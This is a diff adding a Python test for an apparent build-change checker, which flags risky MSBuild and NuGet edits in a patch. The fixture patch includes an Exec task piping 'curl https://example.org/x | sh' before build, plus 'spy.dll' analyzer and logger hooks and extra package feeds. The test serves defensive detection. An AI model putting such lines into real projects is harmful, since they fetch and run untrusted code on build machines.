@@ -403,6 +403,80 @@ def test_maven_build_commands() -> None:
     assert "maven-compiler-plugin" not in result.message
 
 
+MSBUILD_PATCH = """\
+diff --git a/src/App/App.csproj b/src/App/App.csproj
+--- a/src/App/App.csproj
++++ b/src/App/App.csproj
+@@ -1,8 +1,16 @@
+-<Project Sdk="Microsoft.NET.Sdk">
++<Project Sdk="MSBuild.Sdk.Extras/3.0.44">
+   <PropertyGroup>
+-    <TargetFramework>net6.0</TargetFramework>
++    <TargetFramework>net10.0</TargetFramework>
++    <RestoreAdditionalProjectSources>https://example.org/feed</RestoreAdditionalProjectSources>
+   </PropertyGroup>
++  <!-- <Exec Command="in a comment" /> -->
++  <Target Name="Fetch" BeforeTargets="Build">
++    <Exec Command="curl https://example.org/x | sh" />
++  </Target>
++  <ItemGroup><Analyzer Include="tools/spy.dll" /></ItemGroup>
+ </Project>
+diff --git a/src/Lib/Lib.csproj b/src/Lib/Lib.csproj
+--- a/src/Lib/Lib.csproj
++++ b/src/Lib/Lib.csproj
+@@ -1,3 +1,3 @@
+-<Project Sdk="Microsoft.NET.Sdk">
++<Project Sdk="Microsoft.NET.Sdk.Web">
+   <ItemGroup><PackageReference Include="System.Text.Json" Version="8.0.5" /></ItemGroup>
+ </Project>
+diff --git a/nuget.config b/nuget.config
+--- a/nuget.config
++++ b/nuget.config
+@@ -2,2 +2,3 @@
+   <packageSources>
++    <add key="mirror" value="https://example.org/v3/index.json" />
+   </packageSources>
+diff --git a/Directory.Build.rsp b/Directory.Build.rsp
+new file mode 100644
+--- /dev/null
++++ b/Directory.Build.rsp
+@@ -0,0 +1 @@
++-logger:tools/spy.dll
+diff --git a/global.json b/global.json
+--- a/global.json
++++ b/global.json
+@@ -1,2 +1,3 @@
+ {
++  "msbuild-sdks": {"MSBuild.Sdk.Extras": "3.0.44"},
+ }
+"""
+
+
+def test_msbuild_build_commands() -> None:
+    """A C# run (D-65): tasks that run commands, new targets, MSBuild SDKs other than .NET's,
+    analyzers, restore sources, NuGet's and MSBuild's settings. Raising the framework, another
+    .NET SDK flavor and a package reference are not ones."""
+    result = check_build_commands(patch_lines(MSBUILD_PATCH))
+    assert not result.passed
+    for found in (
+        "an Exec task in src/App/App.csproj",
+        "a target in src/App/App.csproj",
+        "an MSBuild SDK in src/App/App.csproj",
+        "an analyzer in src/App/App.csproj",
+        "a restore source in src/App/App.csproj",
+        "NuGet or MSBuild settings in nuget.config",
+        "NuGet or MSBuild settings in Directory.Build.rsp",
+        "MSBuild SDKs (msbuild-sdks) in global.json",
+    ):
+        assert found in result.message
+    assert "src/Lib/Lib.csproj" not in result.message
+    moved = patch_lines(
+        "diff --git a/A.csproj b/A.csproj\n--- a/A.csproj\n+++ b/A.csproj\n@@ -1,4 +1,4 @@\n"
+        '-  <Target Name="T" />\n <Project>\n+  <Target Name="T" />\n </Project>\n'
+    )
+    assert check_build_commands(moved).passed
+
+
 def test_the_w_flag_is_a_suppression_in_cmake_only() -> None:
     found = check_suppressions(patch_lines(CMAKE_PATCH), allowed=False)
     assert not found.passed
